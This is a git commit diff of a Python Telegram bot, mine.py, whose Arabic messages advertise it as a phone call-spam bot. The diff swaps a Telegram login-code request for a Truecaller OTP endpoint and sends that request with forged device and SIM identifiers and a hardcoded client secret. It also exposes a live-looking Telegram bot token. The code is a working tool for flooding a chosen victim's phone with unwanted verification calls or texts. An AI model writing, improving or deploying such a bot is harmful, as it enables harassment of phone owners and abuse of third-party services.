6b7130afbe568aace0629bf030b7c7dc57658fec
odbrg6 <99286663+odbrg6@users.noreply.github.com>
2024-02-15 22:24:09 +0300

    Update mine.py

--- mine.py
+++ mine.py
@@ -1,35 +1,75 @@
-import requests
+import requests , hashlib
+import random
 import telebot
+from telebot.types import InlineKeyboardButton as Btn , InlineKeyboardMarkup as Mak
+import time
 
+asa = '123456789'
+gigk = ''.join(random.choice(asa) for _ in range(10))
+
+md5 = hashlib.md5(gigk.encode()).hexdigest()[:16]
+
+# @mmaahg & ICTS_930
 token = "6724095206:AAHcTqyenhPr3CJUlsRQblMYNHAYiJxZnmc"
 bot = telebot.TeleBot(token)
-headers = {
-    'authority': 'my.telegram.org',
-    'accept': 'application/json, text/javascript, */*; q=0.01',
-    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'origin': 'https://my.telegram.org',
-    'referer': 'https://my.telegram.org/auth',
-    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 12; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
-    'x-requested-with': 'XMLHttpRequest',
-}
-@bot.message_handler(commands=["start"])
+# @mmaahg & ICTS_930
+
+alokt = 0
+
+@bot.message_handler(commands=['start'])
 def start(message):
-	bot.reply_to(message,'ارسل رقمك مع رمز الدول ')
-@bot.message_handler(func=lambda brok:True)
-def num(message):
-    data = {
-    'phone': message.text,
+    name = message.from_user.first_name
+    bot.reply_to(message, f'''اهلا بك عزيزي {name} في بوت 👾 سبام مكالمات عن طريق رقم الهاتف 
+
+ارسل رقم الهاتف
+مع رمز الدولة متبوع بعلامة +
+
+مثال:
++96450100756''',reply_markup=Mak().add(Btn('ميو',callback_data='click')))
+
+def call(number):
+    global alokt
+    current_time = time.time()
+
+    if current_time - alokt >= 60:
+        alokt = current_time
+
+        url = "https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp"
+
+        headers = {
+            "Host": "account-asia-south1.truecaller.com",
+            "content-type": "application/json; charset=UTF-8",
+            "accept-encoding": "gzip",
+            "user-agent": "Truecaller/12.34.8 (Android; 8.1.2)",
+            "clientsecret": "lvc22mp3l1sfv6ujg83rd17btt"
+        }
+
+        data = {"countryCode": "eg","dialingCode": 20,"installationDetails": {"app": {"buildVersion": 8,"majorVersion": 12,"minorVersion": 34,"store": "GOOGLE_PLAY"},"device": {"deviceId": md5,"language": "ar","manufacturer": "Xiaomi","mobileServices": ["GMS"],"model": "Redmi Note 8A Prime","osName": "Android","osVersion": "7.1.2","simSerials": ["8920022021714943876f","8920022022805258505f"]},"language": "ar","sims": [{"imsi": "602022207634386","mcc": "602","mnc": "2","operator": "vodafone"},{"imsi": "602023133590849","mcc": "602","mnc": "2","operator": "vodafone"}],"storeVersion": {"buildVersion": 8,"majorVersion": 12,"minorVersion": 34}},"phoneNumber": number,"region": "region-2","sequenceNo": 1
     }
-    response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data=data)
-    
-    
-    bot.reply_to(message,'تم الارسال')
-    
-bot.polling()
+
+        req = requests.post(url, headers=headers, json=data).json()
+        if req.get('status') == 40003:
+            return 'رقم الهاتف غير صحيح'
+        else:
+            phonum = req.get('parsedPhoneNumber')
+            coucode = req.get('parsedCountryCode')
+            text = f'''تم الارسال
+رقم الهاتف : {phonum} ✅
+رمز البلد : {coucode} .'''
+            return text
+    else:
+        remaining_time = int(60 - (current_time - alokt))
+        return f'لتفادي الظغط على البوت يرجى الإنتظار {remaining_time} ثواني.'
+
+@bot.message_handler(content_types=['text'])
+def num(message):
+    number = message.text
+    spam = call(number)
+    bot.reply_to(message,spam)
+
+@bot.callback_query_handler(func=lambda call: call.data == 'click')
+def all(call):
+	bot.send_message(call.message.chat.id,'''<  مبرمج البوت : @hDO_I0
+قناة مبرمج البوت: @b_idu''')
+
+bot.infinity_polling()
